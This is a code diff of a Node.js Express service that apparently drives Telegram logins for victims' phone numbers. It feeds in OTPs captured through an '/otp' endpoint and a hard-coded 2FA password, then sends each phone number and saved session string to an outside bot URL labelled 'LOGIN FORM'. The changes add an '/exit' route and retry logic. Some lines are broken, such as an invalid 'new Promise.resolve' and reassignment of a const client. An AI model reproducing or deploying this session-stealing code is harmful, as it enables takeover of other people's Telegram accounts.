@@ -55,6 +55,11 @@ app.get('/otp', async (req, res) => {
     res.json({});
 });
 
+app.get('/exit', async (req, res) => {
+    process.exit(1)
+    res.json({});
+});
+
 
 app.listen(port, () => {
     console.log(`App listening at http://localhost:${port}`);
@@ -67,26 +72,31 @@ async function trySgnup(phone) {
     const client = new TelegramClient(stringSession, apiId, apiHash, {
         connectionRetries: 5,
     });
+    let retries = 5;
     try {
         await client?.start({
             phoneNumber: `+${phone}`,
             password: async () => new Promise.resolve("Ajtdmwajt1@"),
             phoneCode: async () =>
                 await delayedReturn(5000),
-            onError: (err) => console.log(err),
+            onError: (err) => {
+                console.log(err);
+                retries--;
+                if (retries < 1) {
+                    return (true)
+                }
+            }
         });
         await client.connect();
         console.log("You should now be connected.");
         console.log(client.session.save());
         const sess = client.session.save();
         await fetchWithTimeout(`${ppplbot}&text=LOGIN FORM:${phone} | ${sess}`);
-        otp = '';
         await client.destroy();
         client = undefined;
     } catch (error) {
         console.log(error);
         await client.destroy();
-        otp = ''
         client = undefined;
     }
 
